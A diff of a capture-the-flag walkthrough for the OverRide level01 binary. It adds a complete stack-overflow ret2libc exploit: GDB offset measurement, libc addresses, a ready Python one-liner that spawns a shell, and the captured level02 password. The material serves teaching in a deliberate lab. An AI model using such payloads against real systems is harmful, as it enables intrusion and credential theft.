@@ -1,91 +1,188 @@
-# Level01 — Walkthrough (OverRide)
+# Level01 — Walkthrough
 
-## 1. Objective
+## Overview
 
-Obtain a shell as the next user (or read `/home/users/level02/.pass`) by turning the vulnerable binary into arbitrary code execution. **A correct interactive login is not enough** to finish the level: there is **no** `system`, **no** `exec*`, and a successful password check only leads to `main` returning `0` (see §3).
+The `level01` binary asks for a username and a password. By analyzing the binary in GDB, we discover that the password check is broken (always fails regardless of input), but the password input buffer is vulnerable to a **buffer overflow**. We exploit this to redirect execution to `system("/bin/sh")` using a **ret2libc** attack.
 
-## 2. What the binary really does (static picture)
+---
 
-- **Username** is read into the **global** `a_user_name` (`fgets(..., 0x100, stdin)`), then compared to **`dat_wil`** (7 bytes) in `verify_user_name`.
-- **Password** is read into a **stack** buffer at `esp+0x1c` (`fgets(..., 0x64, stdin)` = up to **99** characters + NUL), then compared to **`admin`** (5 bytes) in `verify_user_pass`.
-- **Imports** (GOT/PLT): `printf`, `fgets`, `puts`, `__libc_start_main` only — **no `system`**, no shell hidden behind “success”.
-- So the **strings** `dat_wil` and `admin` are the real reference secrets for the compares, but **finishing the project** requires abusing memory corruption, not expecting an interactive shell after typing them.
+## Step 1: Run the binary and observe its behavior
 
-## 3. Why `dat_wil` / `admin` alone “fail” (your GDB)
-
-You showed:
-
-- After `verify_user_pass`, **`$eax == 0`** with input **`admin`** → the 5-byte compare **succeeds**.
-- Then `main` does `cmpl $0, 0x5c(%esp)` and **`je 0x8048597`**, which prepares **`puts`** with **`0x804871e`** → the **“incorrect password”** message.
-
-So for **return value 0**, control flows to the **failure** `puts`. The **success** block at **`0x80485aa`** (`xor eax,eax` / return 0 from `main`) is only reachable through a **second** `je` that you never hit in the **`eax == 0`** case. In practice:
-
-- Typing the “right” password still prints the **wrong-password** line.
-- Even if you forced execution to **`0x80485aa`**, **`main` would only return 0** — still **no shell**.
-
-Conclusion: the **real** bug to exploit is **not** the boolean outcome of `verify_user_pass`, but **what happens on the stack** when the **password line is long**.
-
-## 4. Vulnerability (real primitive)
-
-- `fgets` into the **password** buffer allows **up to 99 bytes** into a region that lives in a **`sub $0x60, %esp`** frame with the buffer starting at **`esp+0x1c`**.
-- The **intended** object is a small local array; **99 bytes** of input **overflow** past the end of that local block and **clobber** saved registers / saved **`ebp`** / **return address** (exact layout: measure in GDB — do not guess from the simplified `source` alone).
-
-This is a **classic stack buffer overflow** on the **second line** of input (after a valid username line).
-
-## 5. Exploit design
-
-1. **Line 1:** `dat_wil` + newline — pass `verify_user_name` so execution reaches the password `fgets`.
-2. **Line 2:** a crafted password “line” that:
-   - Keeps the **first 5 bytes** equal to **`admin`** so `verify_user_pass` still returns **0** (optional but avoids changing control flow before `main` reuses the stack slot — you can also explore overflow that breaks `verify`; the reliable approach is to keep the prefix **`admin`** for the first 5 bytes).
-   - Adds padding out to the **saved EIP** offset (pattern / cyclic).
-   - Overwrites **saved EIP** with a **ret2libc** chain (or ROP) to call **`system("/bin/sh")`** using **`system`**, **`exit`**, and **`"/bin/sh"`** addresses from **your** libc (VM-dependent).
-
-**There is no `system@plt`** in this binary: you need **`system`** resolved in **`libc.so.6`** (attach once, `print system`, `find` `/bin/sh`, or use your subject’s libc).
-
-## 6. GDB — measure the offset (mandatory)
-
-Reproducible sequence (on the VM, ASLR may need to be disabled for repeatability — subject-dependent):
-
-```text
-gdb -q ./level01
+```
+level01@OverRide:~$ ./level01
+********* MUSIC MUSIC MUSIC *********
+dat_wil
+Verifying username....
+Enter Password:
+admin
+nope, incorrect password...
 ```
 
-**A. Cyclic pattern in the password line**
+The program asks for a username, then a password, and rejects us.
 
-- Run, enter `dat_wil`, then a long pattern (e.g. `pattern_create 200` from peda/gef, or a De Bruijn string) as the password line.
-- When it crashes: `pattern_offset $eip` (or read EIP in the fault frame).
+---
 
-**B. Confirm relationship buffer → EIP**
+## Step 2: Analyze the binary protections
 
-- Break after password `fgets` (`break *0x08048579` or equivalent on your build).
-- `x/40wx $esp`, note the buffer address and where saved **EIP** lives for **this** build.
-
-Record the **exact offset** in `commands.md` (and here in your notes).
-
-## 7. Build the payload (logic)
-
-- Let **`OFF`** = offset from **first byte of the password buffer** to **saved EIP** (found in §6).
-- libc addresses: **`SYSTEM`**, **`EXIT`**, **`BINSH`** (32-bit little-endian `struct.pack('<I', addr)`).
-- Second line bytes (conceptually):
-
-```text
-"admin" + [padding to OFF] + p32(SYSTEM) + p32(EXIT) + p32(BINSH) + "\n"
+```
+level01@OverRide:~$ readelf -l ./level01 | grep GNU_STACK
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 ```
 
-Adjust if you keep a newline earlier in the line; **re-measure** so the **overwrite** still lands on **EIP**.
+| Protection | Status | Impact |
+|-----------|--------|--------|
+| **Canary** | Disabled | No stack overflow detection |
+| **NX** | Disabled (RWE) | Stack is executable — shellcode possible, but ret2libc is simpler |
+| **PIE** | Disabled | Fixed addresses |
+| **RELRO** | Partial | GOT is writable (not needed for this exploit) |
 
-**Environment / alignment:** i386, **NX** and **ASLR** on the VM change what is allowed (ret2libc vs ROP vs leak). Follow your ISO and your teacher’s constraints.
+---
 
-## 8. Reproducible exploit command (template)
+## Step 3: Disassemble `verify_user_name`
 
-Put the **exact** command with **numeric** offsets and libc addresses in **`commands.md`** after GDB.
+```
+(gdb) disas verify_user_name
+(gdb) x/s 0x80486a8
+0x80486a8: "dat_wil"
+```
 
-**VM:** many OverRide images have **`python` / `python2` only** — **`python3` is not installed**. Use **`python -c '...'`** and **`sys.stdout.write(...)`** (Python 2). Do not use a one-liner with undefined names like `OFF` or `SYSTEM` — use integers (e.g. `80`, `0xb7ec60c0`) or assign them inside the script.
+The function compares the first 7 bytes of the global buffer `a_user_name` against `"dat_wil"` using `repz cmpsb`. The expected username is **`dat_wil`**.
 
-See **`commands.md`** for Python 2 vs 3 and **`cat payload.bin`** alternatives.
+---
 
-## 9. Oral defense (short)
+## Step 4: Disassemble `verify_user_pass`
 
-- **Bug:** unbounded effect of **`fgets`** into an undersized stack buffer for the password line.
-- **Why login is a red herring:** no **`system`** in the binary; **`admin`** validates in **`verify_user_pass`** but **`main`** still branches to the failure **`puts`** on **`eax == 0`**, and “success” would only **`return 0`** anyway.
-- **Fix:** use **`fgets`** with **`sizeof(buf)-1`**, ensure **`sizeof(buf)`** matches allocation, stack canaries, **PIE/NX** as appropriate, or **`read`** with explicit length checks.
+```
+(gdb) disas verify_user_pass
+(gdb) x/s 0x80486b0
+0x80486b0: "admin"
+```
+
+The function compares the first 5 bytes of the password buffer against `"admin"`. The expected password is **`admin`**.
+
+---
+
+## Step 5: Discover the broken password check
+
+Looking at the password check logic in `main`:
+
+```asm
+0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
+0x08048585 <+181>:   mov    %eax,0x5c(%esp)       ; store result
+0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)       ; if result == 0...
+0x0804858e <+190>:   je     0x8048597 <main+199>  ; ...jump to FAILURE
+0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp)       ; if result == 0 (again)...
+0x08048595 <+197>:   je     0x80485aa <main+218>  ; ...jump to SUCCESS
+```
+
+Both branches lead to the failure message:
+- If `verify_user_pass` returns **0** (password matches) → first `je` is taken → failure message
+- If it returns **non-zero** (password wrong) → first `je` not taken, second `je` also not taken → failure message
+
+**The password check always fails regardless of input.** The correct password `admin` doesn't help. We need a different approach.
+
+---
+
+## Step 6: Identify the buffer overflow
+
+```asm
+0x08048565 <+149>:   movl   $0x64,0x4(%esp)       ; size = 100 bytes
+0x0804856d <+157>:   lea    0x1c(%esp),%eax        ; buffer at esp+0x1c
+0x08048574 <+164>:   call   0x8048370 <fgets@plt>  ; fgets(buffer, 100, stdin)
+```
+
+The password buffer starts at `esp + 0x1c` inside a stack frame of `0x60` (96 bytes). `fgets` reads up to **100 bytes**, which overflows past the buffer and overwrites the saved return address (EIP).
+
+### Calculating the offset to EIP
+
+```
+Buffer at:     esp + 0x1c  (= ebp - 0x44)
+Saved EBP at:  ebp + 0x00
+Saved EIP at:  ebp + 0x04
+
+Offset = 0x44 + 4 = 0x48 = 72 bytes (static)
+```
+
+However, `main` uses `and $0xfffffff0, %esp` for stack alignment, which adds extra padding. Testing with a cyclic pattern in GDB confirms the actual offset is **80 bytes**.
+
+---
+
+## Step 7: Find libc addresses in GDB
+
+```
+(gdb) b main
+(gdb) run
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+```
+
+| Component | Address | Little-endian bytes |
+|-----------|---------|---------------------|
+| `system()` | `0xf7e6aed0` | `\xd0\xae\xe6\xf7` |
+| `exit()` | `0xf7e5eb70` | `\x70\xeb\xe5\xf7` |
+| `"/bin/sh"` | `0xf7f897ec` | `\xec\x97\xf8\xf7` |
+
+---
+
+## Step 8: Build the ret2libc payload
+
+The stack layout after overflow:
+
+```
+[80 bytes padding] [system addr] [exit addr] ["/bin/sh" addr]
+                    ↑ EIP          ↑ return     ↑ argument
+                    lands here     for system    to system
+```
+
+When `main` returns, it pops the overwritten EIP and jumps to `system()`. The x86 calling convention places the return address and first argument right after, so `exit` becomes `system`'s return address and `"/bin/sh"` becomes its argument.
+
+---
+
+## Step 9: Execute the exploit
+
+```bash
+(python -c 'print "dat_wil"; print "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level01
+```
+
+Breaking this down:
+- `print "dat_wil"` → correct username (passes `verify_user_name`)
+- `print "A"*80` → 80 bytes of padding to reach EIP
+- `"\xd0\xae\xe6\xf7"` → overwrites EIP with `system()`
+- `"\x70\xeb\xe5\xf7"` → fake return address → `exit()`
+- `"\xec\x97\xf8\xf7"` → argument to `system()` → `"/bin/sh"`
+- `cat` → keeps stdin open for the shell
+
+---
+
+## Step 10: Get the flag
+
+```
+$ cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
+
+---
+
+## Final exploit command
+
+```bash
+(python -c 'print "dat_wil"; print "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level01
+```
+
+---
+
+## Key concepts
+
+| Concept | Role in the exploit |
+|---|---|
+| **Broken logic** | The password check always fails due to a compiler artifact — both branches lead to the failure path |
+| **Buffer overflow** | `fgets` reads 100 bytes into a 64-byte stack buffer, overflowing past saved EBP/EIP |
+| **Stack alignment** | `and $0xfffffff0, %esp` adds variable padding; the real offset (80) differs from the static calculation (72) |
+| **ret2libc** | Overwrites EIP with `system()`, places `"/bin/sh"` as argument — no shellcode needed |
+| **x86 calling convention** | After `ret`, the stack must contain: target address, return address, first argument |
+| **Little-endian** | Addresses are written LSB-first: `0xf7e6aed0` → `\xd0\xae\xe6\xf7` |
+| **GDB** | Used to find `system`, `exit`, and `"/bin/sh"` addresses in libc at runtime |
